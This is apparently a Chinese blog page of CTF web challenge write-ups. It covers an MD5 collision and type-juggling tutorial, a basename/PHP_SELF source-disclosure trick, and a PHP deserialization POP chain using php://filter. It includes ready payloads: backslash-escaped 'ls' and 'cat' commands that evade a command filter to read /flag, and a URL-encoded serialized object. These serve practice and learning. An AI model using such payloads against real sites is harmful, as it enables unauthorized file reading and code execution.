<p>发现是MD5的强比较看到有（string），要有$a &#x3D; %4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<br>&amp;$b &#x3D; %4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2进行绕过，<br>过滤了ls，使用dir</p>
<p>这里抓包放进去</p>
<p>然后在url的cmd传参处传入dir</p>
<p>目录下面没有flag，查看根目录，空格用%20代替</p>
<p>payload：l\s%20&#x2F;<br>看到flag，然后输入cat flag&#x3D;&gt;ca\t%20&#x2F;f\l\a\g便得到flag。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/26/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/" data-id="cm6dmo6db00003ox1dm5i7aa3" data-title="[安洵杯 2019]easy_web" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-极客大挑战-2019-Havefun" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun/" class="article-date">
  <time class="dt-published" datetime="2025-01-26T12:21:29.000Z" itemprop="datePublished">2025-01-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun/">[极客大挑战 2019]Havefun</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>打开靶机，看到有一个小猫，但是没有什么特殊的地方。于是便想到查看源代码。</p>
<!--
        $cat=$_GET['cat'];
        echo $cat;
        if($cat=='dog'){
            echo 'Syc{cat_cat_cat_cat}';
        }
        -->
<p>看到最后有如上的一段代码。看到是get传参，便想到在url中输入?cat&#x3D;dog，然后传参。<br>便得到flag&#x3D;{68dd5b2e-74f0-4c19-a280-085a56e1bf1c}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun/" data-id="cm6dlhndw000018x18ruqft8z" data-title="[极客大挑战 2019]Havefun" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-MD5碰撞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/24/MD5%E7%A2%B0%E6%92%9E/" class="article-date">
  <time class="dt-published" datetime="2025-01-24T07:16:30.000Z" itemprop="datePublished">2025-01-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/24/MD5%E7%A2%B0%E6%92%9E/">MD5碰撞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>简单了解MD5：<br>md5是一种加密算法，并且不能防止碰撞破解。<br>md5加密是不可逆的，这就意味着有两串不同的字符串加密出来的内容却是相同的<br>加密过程简单，碰撞还原字符难<br>PHP的弱比较：<br>先提两个例子：</p>
<p>var_dump(“123a”&#x3D;&#x3D;123)</p>
<p>var_dump(“123a”&#x3D;&#x3D;”123”)</p>
<p>在没有认真总结前，完全不知道弱比较还要区分与字符串类型比较还是与int类型比较</p>
<p>上述实例的结果是：</p>
<p>True</p>
<p>False</p>
<p>字符串与int类型比较:<br>PHP规定当进行字符串与数字的弱比较时，会进行如下步骤：</p>
<p>先看字符串开头是否为数字，如果为数字，则截止到连续数字的最后一个数字，即”123abc456”&#x3D;&gt;123</p>
<p>如果开头不为数字，则判断为false，即0。因此</p>
<p>(“aaa123”&#x3D;&#x3D;0) &#x3D;&gt;true</p>
<p>(“123a”&#x3D;&#x3D;123) &#x3D;&gt;true<br>md5弱比较<br>弱类型比较规则：</p>
<p>0e开头跟数字的字符串（例如”0e123”）会当作科学计数法去比较，所以和0相等；<br>“0x”开头跟数字的字符串（例如”0x1e240”）会被当作16进制数去比较；<br>布尔值true和任意字符串都弱相等。<br>当比较的一方是字符串时，会先把其转换为数字，不能转换为数字的字符串（例如”aaa”是不能转换为数字的字符串而”123”或”123aa”或”0x10”或”2e2”就是可以转换为数字的字符串）或null，被转换为0。<br>12cdf只取字符串中开头的整数部分，但是1e3dgf这样的字符串在比较时，取的是符合科学计数法的部分：1e3，也就是1000。<br>当有一个对比参数是整数的时候，会把另外一个参数强制转换为整数。<br>0e绕过<br>加密后为科学计算法0e格式可以让md5<br>QNKCDZO<br>0e830400451993494058024219903391</p>
<p>s878926199a<br>0e545993274517709034328855841020<br>数组绕过<br>数组绕过：a[]&#x3D;a&amp;b[]&#x3D;b，传入参数为数组则MD5返回NULL，null&#x3D;null，判断为true，绕过</p>
<p>md5强比较<br>数组绕过：a[]&#x3D;a&amp;b[]&#x3D;b，传入参数为数组则MD5返回NULL，null&#x3D;null，判断为true，绕过</p>
<p>还有强制类型转换时数组就不行了</p>
<p>参考大佬的两种相同url的值</p>
<p>param1&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2<br>param2&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<br>Param1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<br>Param2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>
<p>md5强碰撞<br>fastcoll构造文件</p>
<p>GitHub - cr-marcstevens&#x2F;hashclash: Project HashClash - MD5 &amp; SHA-1 cryptanalysis</p>
<p>.&#x2F;fastcoll 1.jpg</p>
<p>生成了两个文件</p>
<p>文件加密后相等</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/24/MD5%E7%A2%B0%E6%92%9E/" data-id="cm6afw4s10000agx1chg66ver" data-title="MD5碰撞" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Zer0pts2020-Can-you-guess-it" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/19/Zer0pts2020-Can-you-guess-it/" class="article-date">
  <time class="dt-published" datetime="2025-01-19T12:50:41.000Z" itemprop="datePublished">2025-01-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/19/Zer0pts2020-Can-you-guess-it/">[Zer0pts2020]Can you guess it?</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>首先打开靶机，发现<br>Can you guess it?<br>If your guess is correct, I’ll give you the flag.</p>
<p>Source<br>还有一个搜索框，点source，发现一段代码。<br>&lt;?php<br>include ‘config.php’; &#x2F;&#x2F; FLAG is defined in config.php</p>
<p>if (preg_match(‘&#x2F;config.php/*$&#x2F;i’, $_SERVER[‘PHP_SELF’])) {<br>  exit(“I don’t know what you are thinking, but I won’t let you read it :)”);<br>}</p>
<p>if (isset($_GET[‘source’])) {<br>  highlight_file(basename($_SERVER[‘PHP_SELF’]));<br>  exit();<br>}</p>
<p>$secret &#x3D; bin2hex(random_bytes(64));<br>if (isset($_POST[‘guess’])) {<br>  $guess &#x3D; (string) $_POST[‘guess’];<br>  if (hash_equals($secret, $guess)) {<br>    $message &#x3D; ‘Congratulations! The flag is: ‘ . FLAG;<br>  } else {<br>    $message &#x3D; ‘Wrong.’;<br>  }<br>}<br>?&gt;<br><!doctype html></p>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Can you guess it?</title>
  </head>
  <body>
    <h1>Can you guess it?</h1>
    <p>If your guess is correct, I'll give you the flag.</p>
    <p><a href="?source">Source</a></p>
    <hr>
<?php if (isset($message)) { ?>
    <p><?= $message ?></p>
<?php } ?>
    <form action="index.php" method="POST">
      <input type="text" name="guess">
      <input type="submit">
    </form>
  </body>
</html>
对代码进行分析，首先便看到flag在config.php中。但是如果按照绕过hash_equals的思路来是行不通的，该函数并没有漏洞也没有使用错误。
但是可以留意到显示源码的逻辑部分故作玄虚没有使用简洁的__FILE__而是采用basename函数截取$_SERVER['PHP_SELF']，本题的利用点也就在此处。
if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

<p>if (isset($_GET[‘source’])) {<br>  highlight_file(basename($_SERVER[‘PHP_SELF’]));<br>  exit();<br>}<br>$_SERVER[‘PHP_SELF’]会获取我们当前的访问路径，并且PHP在根据URI解析到对应文件后会忽略掉URL中多余的部分，即若访问存在的index.php页面，如下两种UR均会访问到。<br>&#x2F;index.php<br>&#x2F;index.php&#x2F;dosent_exist.php<br>basename可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录，即：</p>
<p>$var1&#x3D;”&#x2F;config.php&#x2F;test”<br>basename($var1)	&#x3D;&gt; test<br>$var2&#x3D;”&#x2F;config.php&#x2F;%ff”<br>basename($var2)	&#x3D;&gt;	config.php<br>最后便是通过构造URI让其包含config.php这个文件名再让basename函数截取出来，之后通过请求参数source就能显示config.php的源码，也就能见到flag了。&lt;?php<br>define(‘FLAG’, ‘flag{56994dd6-36ff-4887-ae8f-505ad3879585}’);</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/19/Zer0pts2020-Can-you-guess-it/" data-id="cm63mj1ev0000w4x1f9hb8zdg" data-title="[Zer0pts2020]Can you guess it?" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-题1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/19/%E9%A2%981/" class="article-date">
  <time class="dt-published" datetime="2025-01-19T12:29:04.000Z" itemprop="datePublished">2025-01-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/19/%E9%A2%981/">题1</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>首先先打开靶机，发现有几段代码。<br>Welcome to index.php<br>&lt;?php<br>&#x2F;&#x2F;flag is in flag.php<br>&#x2F;&#x2F;WTF IS THIS?<br>&#x2F;&#x2F;Learn From <a target="_blank" rel="noopener" href="https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</a><br>&#x2F;&#x2F;And Crack It!<br>class Modifier {<br>    protected  $var;<br>    public function append($value){<br>        include($value);<br>    }<br>    public function __invoke(){<br>        $this-&gt;append($this-&gt;var);<br>    }<br>}</p>
<p>class Show{<br>    public $source;<br>    public $str;<br>    public function __construct($file&#x3D;’index.php’){<br>        $this-&gt;source &#x3D; $file;<br>        echo ‘Welcome to ‘.$this-&gt;source.”<br>“;<br>    }<br>    public function __toString(){<br>        return $this-&gt;str-&gt;source;<br>    }</p>
<pre><code>public function __wakeup()&#123;
    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;
        echo &quot;hacker&quot;;
        $this-&gt;source = &quot;index.php&quot;;
    &#125;
&#125;
</code></pre>
<p>}</p>
<p>class Test{<br>    public $p;<br>    public function __construct(){<br>        $this-&gt;p &#x3D; array();<br>    }</p>
<pre><code>public function __get($key)&#123;
    $function = $this-&gt;p;
    return $function();
&#125;
</code></pre>
<p>}</p>
<p>if(isset($_GET[‘pop’])){<br>    @unserialize($_GET[‘pop’]);<br>}<br>else{<br>    $a&#x3D;new Show;<br>    highlight_file(<strong>FILE</strong>);<br>}<br>根据题目pop和代码内容可知这是考查反序列化的。</p>
<p>由这个可知flag包含在flag.php中。再往后是三个类Modifier、show、test。先了解一些反序列化的魔法方法<br>__construct()&#x2F;&#x2F;当一个对象创建时被调用<br>__destruct() &#x2F;&#x2F;当一个对象销毁时被调用<br>__toString() &#x2F;&#x2F;当一个对象被当作一个字符串使用<br>__sleep()&#x2F;&#x2F;在对象在被序列化之前运行<br>__wakeup()&#x2F;&#x2F;将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)<br>__get()&#x2F;&#x2F;获得一个类的成员变量时调用<br>__set()&#x2F;&#x2F;设置一个类的成员变量时调用<br>__invoke()&#x2F;&#x2F;调用函数的方式调用一个对象时的回应方法<br>__call()&#x2F;&#x2F;当调用一个对象中的不能用的方法的时候就会执行这个函数<br>还要补充一个基础的知识，-&gt;是php中的运算符。<br>先分析第一段。<br>class Modifier {<br>    protected  $var;<br>    public function append($value){<br>        include($value);<br>    }<br>    public function __invoke(){<br>        $this-&gt;append($this-&gt;var);<br>    }<br>}</p>
<p>有魔法方法_invoke（当调用一个对象中的不能用的方法的时候就会执行这个函数），此处应用php伪协议来调用flag.php。<br>$var&#x3D;”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”<br>再看第二段<br>class Show{<br>    public $source;<br>    public $str;<br>    public function __construct($file&#x3D;’index.php’){<br>        $this-&gt;source &#x3D; $file;<br>        echo ‘Welcome to ‘.$this-&gt;source.”<br>“;<br>    }<br>    public function __toString(){<br>        return $this-&gt;str-&gt;source;<br>    }</p>
<pre><code>public function __wakeup()&#123;
    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;
        echo &quot;hacker&quot;;
        $this-&gt;source = &quot;index.php&quot;;
    &#125;
&#125;
</code></pre>
<p>}<br>出现_toString()(当一个对象被当作一个字符串使用),和黑名单_wakeup. 给$str赋值为对象Test，而Test中不存在成员属性source，则可以触发Test里面的成员方法__get给；$source赋值为对象Show，当成字符串被echo调用，触发toString。<br>看第三段<br>class Test{<br>    public $p;<br>    public function __construct(){<br>        $this-&gt;p &#x3D; array();<br>    }</p>
<pre><code>public function __get($key)&#123;
    $function = $this-&gt;p;
    return $function();
&#125;
</code></pre>
<p>}<br>有_get()(获得一个类的成员变量时调用), 给$p赋值为对象，即function成为对象Modifier却被当成函数调用，触发Modifier中的invoke.<br>最终思路</p>
<p>1.调用include()函数，让Test类中的属性p等于Modifier这个类，从而触发__get()魔术方法<br>将Modifier这个类变成一个函数，从而调用__invoke()方法，进而调用include()函数<br>2.让source 等于对象，进而触发__toString方法，输出内容。<br>最后的exp为<br>并得到序列化后的内容为<br>O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BN%3B%7D%7D</p>
<p>然后在url中输入传参，便得到一串代码，放到SKR中解码得到flag。<br><?php
class Flag{
    private $flag= "flag{9c3e90cd-e4b5-4230-887c-18efcfcaf3b4}";
}
echo "Help Me Find FLAG!";
?></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/19/%E9%A2%981/" data-id="cm63lhrkb0000igx13g8fh4kf" data-title="题1" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/02/09/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/">[红明谷CTF 2021]write_shell</a>
          </li>
        
          <li>
            <a href="/2025/02/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">报错注入</a>
          </li>
        
          <li>
            <a href="/2025/02/02/CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math/">[CISCN 2019 初赛]Love Math</a>
          </li>
        
          <li>
            <a href="/2025/02/02/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php-1/">[安洵杯 2019]easy_serialize_php 1</a>
          </li>
        
          <li>
            <a href="/2025/02/01/%E2%80%98%E3%80%90%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0WAF%E7%BB%95%E8%BF%87%E3%80%91%E2%80%99/">‘【文件上传WAF绕过】’</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>